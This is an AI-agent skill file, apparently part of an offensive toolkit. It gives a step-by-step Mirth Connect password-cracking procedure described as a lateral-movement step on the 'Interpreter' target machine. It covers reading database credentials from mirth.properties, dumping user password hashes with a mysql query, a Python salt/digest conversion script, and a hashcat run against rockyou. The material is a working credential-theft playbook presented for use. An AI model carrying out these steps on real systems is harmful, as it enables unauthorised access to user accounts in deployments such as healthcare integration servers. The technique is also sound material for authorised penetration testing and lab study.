---
name: 'mirth-connect-hash-crack'
description: 'Mirth Connect password hash格式：Base64(salt||digest)拆分→hashcat -m 10900。Interpreter靶机横向关键步骤。'
disable-model-invocation: true
metadata: { domain: creds, tier: T3 }
---
> 📌 DSH 适配：本技能移植自 RS。原 read_skill/run_skill 调用 = 用 DSH 的 skill 工具按名加载对应技能；fleet/kali-mcp = 用 bash 后台任务与 subagent 工具实现。

## Mirth Connect Password Hash Cracking

### 版本对照
| 版本 | 算法 | 迭代 | Salt |
|------|------|------|------|
| < 4.4.0 | SHA-256 | 1,000 | 8 bytes |
| ≥ 4.4.0 | PBKDF2WithHmacSHA256 | 600,000 | 8 bytes |

### 提取 Hash
```bash
# 从 mirth.properties 获取 DB 凭据
grep -i 'database.*password\|database.url' /opt/mirthconnect/conf/mirth.properties
# 连接
mysql -u mirthdb -p mirthdb -e "SELECT username, password FROM PERSON JOIN PERSON_PASSWORD ON PERSON.id = PERSON_PASSWORD.person_id;"
```

### 存储格式
`PERSON_PASSWORD.password` 是 **Base64(8字节salt || 32字节PBKDF2 digest) = 40字节**。
不能直接喂给 hashcat！需要拆分 salt 和 digest。

### 转换脚本
```python
import base64

stored = base64.b64decode("u/+LBBOUnadiyFBsMOoIDPLbUR0rk59kEkPU17itdrVWA/kLMt3w+w==")
salt_b64 = base64.b64encode(stored[:8]).decode()
hash_b64 = base64.b64encode(stored[8:]).decode()
print(f"sha256:600000:{salt_b64}:{hash_b64}")
# → sha256:600000:u/+LBBOUnac=:YshQbDqCAzy21EdK5OfZBJD1Ne4rXa1VgP5CzLd8Ps=
```

### 破解
```bash
hashcat -m 10900 mirth.hash /usr/share/wordlists/rockyou.txt
```

### 注意
- hashcat `-m 10900` 期望 `sha256:iterations:base64_salt:base64_hash`
- 迭代次数可能不是 600000 — 检查 `mirth.properties` 中 `digest.iterations`
- 如果 `mirth.properties` 没有 `digest.algorithm`，版本默认值适用
